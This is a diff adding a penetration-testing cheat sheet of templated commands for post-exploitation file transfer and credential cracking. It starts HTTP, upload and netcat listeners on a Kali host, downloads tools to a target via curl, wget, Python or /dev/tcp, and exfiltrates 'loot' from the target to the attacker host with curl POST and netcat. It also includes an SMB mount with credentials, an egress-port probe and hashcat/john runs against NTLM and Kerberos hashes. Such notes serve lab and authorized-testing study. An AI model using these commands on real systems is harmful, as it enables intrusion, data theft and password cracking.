@@ -1,0 +1,57 @@
+# === KALI: START SERVERS ===
+# HTTP server (serve files to target)
+python3 -m http.server {{KALI_PORT}}
+# Upload receiver (needed for curl POST uploads from target)
+python3 -m uploadserver {{KALI_PORT}}
+# Netcat listener
+rlwrap nc -nvlp {{KALI_PORT}}
+
+# === LINUX: DOWNLOAD TO TARGET ===
+# curl (preferred)
+curl -o /tmp/{{FILENAME}} http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}
+curl -s -o /tmp/{{FILENAME}} http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}
+# wget
+wget http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}} -O /tmp/{{FILENAME}}
+# Python fallback (no curl/wget)
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://{{KALI}}:{{KALI_PORT}}/{{FILENAME}}','/tmp/{{FILENAME}}')"
+# /dev/tcp fallback (no tools at all - bash built-in)
+exec 3<>/dev/tcp/{{KALI}}/{{KALI_PORT}}
+printf "GET /{{FILENAME}} HTTP/1.0\r\nHost: {{KALI}}\r\n\r\n" >&3
+cat <&3 | sed '1,/^\r$/d' > /tmp/{{FILENAME}}
+exec 3>&-
+
+# === LINUX: UPLOAD FROM TARGET ===
+# curl POST to uploadserver on Kali
+curl -X POST -F "file=@/path/to/loot.txt" http://{{KALI}}:{{KALI_PORT}}/upload
+# Netcat (start nc -lvnp {{KALI_PORT}} > outfile on Kali first)
+nc {{KALI}} {{KALI_PORT}} < /path/to/file
+# Base64 encode for copy-paste
+base64 /path/to/file | tr -d '\n'
+# Decode on Kali
+echo '<BASE64_STRING>' | base64 -d > {{FILENAME}}
+
+# === SCP (when SSH available) ===
+# Download from target
+scp {{USER}}@{{TARGET}}:/path/to/file /tmp/
+# Upload to target
+scp /home/kali/{{FILENAME}} {{USER}}@{{TARGET}}:/tmp/
+# With key
+scp -i {{KEY_FILE}} {{USER}}@{{TARGET}}:/path/to/file /tmp/
+
+# === SMB MOUNT ===
+# Start share on Kali first: sudo impacket-smbserver share . -smb2support
+mkdir /mnt/share
+sudo mount -t cifs //{{KALI}}/share /mnt/share -o username={{USER}},password={{PASS}}
+cp /mnt/share/{{FILENAME}} /tmp/
+sudo umount /mnt/share
+
+# === FIND EGRESS PORTS ===
+# Identify which ports can reach Kali (run on target)
+for port in 21 22 80 139 443 445 8080 8443; do wget -O /dev/null -T1 -t1 http://{{KALI}}:$port 2>&1 | grep -v "refused" && echo "Port $port reachable"; done
+
+# === HASH CRACKING ===
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
